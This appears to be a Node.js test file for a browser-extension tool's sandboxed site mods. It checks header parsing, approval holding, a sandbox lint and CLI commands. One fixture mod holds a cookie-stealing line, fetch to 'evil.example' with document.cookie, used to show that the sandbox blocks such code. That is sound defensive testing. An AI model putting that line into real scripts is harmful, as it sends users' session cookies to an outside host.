'use strict';
// Sandboxed mods, the helper's side: the header, the scanner, never held, `trif check`'s lint, `trif new
// --sandboxed`, and the ported samples (examples/sandboxed). The sandbox itself (extension/sandbox.js) is
// tested in the browsers (tests/e2e/scenario.js sandboxedChecks); its registration in tests/extension.test.js.

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { parseHeader, scanMods, buildMod } = require('../helper/lib/mods');
const { updateHeld, needsOf } = require('../helper/lib/held');
const { modSnapshot } = require('../helper/lib/runs');
const { sandboxLint } = require('../helper/lib/sandboxlint');
const { runCli, writeMod, tempDir, REPO } = require('./fake-extension');

const header = (extra = '') => `// ==WebMod==\n// @name Bouncer\n// @match https://x.com/*\n// @sandboxed\n${extra}// ==/WebMod==\n`;

test('@sandboxed: the scanner marks the mod; other mods\' hashes stay as they were; not with @rules', () => {
  assert.equal(parseHeader(header()).sandboxed, true);
  assert.equal(parseHeader('// ==WebMod==\n// @name A\n// ==/WebMod==\n').sandboxed, false);
  const plain = '// ==WebMod==\n// @name A\n// @match https://x.com/*\n// ==/WebMod==\nconsole.log(1);\n';
  const a = buildMod({ site: 'x.com', file: '/w/sites/x.com/a.js', code: plain }).mod;
  assert.equal(a.sandboxed, undefined);
  // (the hash every mod had before sandboxed mods: the same JSON, so seen.json and allowed.json still match)
  const crypto = require('crypto');
  const want = crypto.createHash('sha1').update(JSON.stringify([a.id, a.name, a.description, a.matches, a.excludes, a.runAt, a.risk, false]) + '\n' + plain).digest('hex');
  assert.equal(a.hash, want);
  const b = buildMod({ site: 'x.com', file: '/w/sites/x.com/b.js', code: header() + 'trif.hide(".ad");\n' }).mod;
  assert.equal(b.sandboxed, true);
  assert.match(b.code, /trif\.hide/);
  assert.throws(() => buildMod({ site: 'x.com', file: '/w/sites/x.com/c.js', code: header('// @rules\n') + '{}' }), /either @rules .* or @sandboxed/);
});

test('a sandboxed mod never waits for the user\'s OK, whoever wrote it, whatever its code names', () => {
  const home = tempDir('trif-sbx-');
  const ws = { home, modsDir: path.join(home, 'sites') };
  fs.mkdirSync(path.join(ws.modsDir, 'x.com'), { recursive: true });
  updateHeld(ws, [], []); // (the first sync: nothing yet)
  const before = modSnapshot(ws.modsDir, ws.home);
  // (code that, as a page script, would be held: it would fail in the sandbox, where none of this exists)
  fs.writeFileSync(path.join(ws.modsDir, 'x.com', 'bouncer.js'), header() + 'fetch("https://evil.example/?" + document.cookie); document.querySelector("button").click();\n');
  const { mods } = scanMods(ws.modsDir);
  assert.equal(mods[0].sandboxed, true);
  assert.deepEqual(needsOf(mods[0], null), []);
  assert.deepEqual(updateHeld(ws, mods, [{ runId: 'r1', site: 'x.com', scope: 'x.com', before }]), {});
  // (a side-panel run's sandboxed mod for another site is still held for that, like a rules mod)
  fs.writeFileSync(path.join(ws.modsDir, 'x.com', 'bouncer.js'), header().replace('https://x.com/*', 'https://bank.example/*') + 'trif.hide("a");\n');
  const held = updateHeld(ws, scanMods(ws.modsDir).mods, [{ runId: 'r1', site: 'x.com', scope: 'x.com', before }]);
  assert.deepEqual(held['x.com/bouncer'].needs, ['match:https://bank.example/*']);
});

test('sandboxLint: what the sandbox wouldn\'t give a mod, as a lint', () => {
  const lint = sandboxLint(`const parent = page.find('nav');
document.body.innerHTML = '<b>hi</b>';
window.fetch('/x'); localStorage.setItem('a', 1);
page.find('a').addEventListener('click', () => {});
const go = (location) => location;
setTimeout('alert(1)', 10);
page.find('a').style.color = 'red';
// a dynamic import( in a comment
const o = { window: 1, document: 2 }; page.find('a').click();
const s = '<!-- x';
`);
  const what = lint.map((l) => l.what);
  assert.deepEqual(what, ['document', '.innerHTML', 'window', 'localStorage', '.addEventListener', 'setTimeout("…")', '.style.…', 'import(', '.click', '<!-- or -->']);
  assert.deepEqual(lint.find((l) => l.what === 'document').lines, [2]);
  assert.match(lint.find((l) => l.what === '.innerHTML').why, /setText/);
  assert.match(lint.find((l) => l.what === '.click').why, /can't click/);
  // the API, and the language: nothing
  assert.deepEqual(sandboxLint(`trif.css('a { color: red }'); trif.observe('article', (a) => { if (a.text.includes('Ad')) a.hide(); });
const prefs = await trif.settings('prefs', { on: true }); setTimeout(() => console.log(Math.random(), Date.now()), 5);
requestAnimationFrame((t) => page.find('#x').style('transform', 'translate(' + t + 'px)'));`), []);
});

test('trif check: a sandboxed mod never waits; what the sandbox would refuse is listed, not a failure', async () => {
  const home = tempDir();
  const okFile = writeMod(home, 'x.com', 'calm.js', header() + 'trif.hide(".ad");\nreturn;\n');
  let r = await runCli(['check', okFile, '--json'], { home });
  assert.equal(r.code, 0, r.stderr);
  const j = JSON.parse(r.stdout);
  assert.deepEqual([j.ok, j.sandboxed, j.powers, j.lint], [true, true, [], []]);
  r = await runCli(['check', 'x.com/calm'], { home });
  assert.match(r.stdout, /is a sandboxed mod and parses/);
  assert.match(r.stdout, /never waits for the user's OK/);
  assert.match(r.stdout, /nothing in it that the sandbox would refuse/);
  const badFile = writeMod(home, 'x.com', 'old.js', header() + 'document.querySelector("a").click();\n');
  r = await runCli(['check', badFile], { home });
  assert.equal(r.code, 0, r.stderr);
  assert.match(r.stdout, /- document: not there in a sandboxed mod/);
  assert.match(r.stdout, /- \.click: a sandboxed mod can't click for the user/);
  assert.match(r.stdout, /line 6: document\.querySelector/);
  // a syntax error is still one (with the file's own line numbers)
  const broken = writeMod(home, 'x.com', 'broken.js', header() + 'const = 1;\n');
  r = await runCli(['check', broken], { home });
  assert.equal(r.code, 1);
  assert.match(r.stdout, /broken\.js:6/);
  // both @rules and @sandboxed: an error
  const both = writeMod(home, 'x.com', 'both.js', header('// @rules\n') + '{}\n');
  r = await runCli(['check', both], { home });
  assert.equal(r.code, 1);
  assert.match(r.stdout, /either @rules/);
});

test('trif new --sandboxed: a sandboxed template that checks out clean', async () => {
  const home = tempDir();
  fs.mkdirSync(path.join(home, 'sites'), { recursive: true });
  let r = await runCli(['new', 'example.com', 'bouncy', '--sandboxed'], { home });
  assert.equal(r.code, 0, r.stderr);
  const file = path.join(home, 'sites', 'example.com', 'bouncy.js');
  const text = fs.readFileSync(file, 'utf8');
  assert.equal(parseHeader(text).sandboxed, true);
  r = await runCli(['check', file, '--json'], { home });
  assert.deepEqual(JSON.parse(r.stdout).lint, []);
  r = await runCli(['new', 'example.com', 'two', '--sandboxed', '--rules'], { home });
  assert.notEqual(r.code, 0);
});

test('the sandboxed examples (ports of Tim\'s Simple Shopping and DVD Logo) are sandboxed mods that check out clean', () => {
  const dir = path.join(REPO, 'examples', 'sandboxed');
  const files = ['amazon.com/simple-shopping.js', 'www.google.com/dvd-logo.js'];
  for (const f of files) {
    const text = fs.readFileSync(path.join(dir, f), 'utf8');
    assert.equal(parseHeader(text).sandboxed, true, f);
    assert.deepEqual(sandboxLint(text), [], f);
    new vm.Script(`(function () {\n${text}\n})`); // parses
  }
});
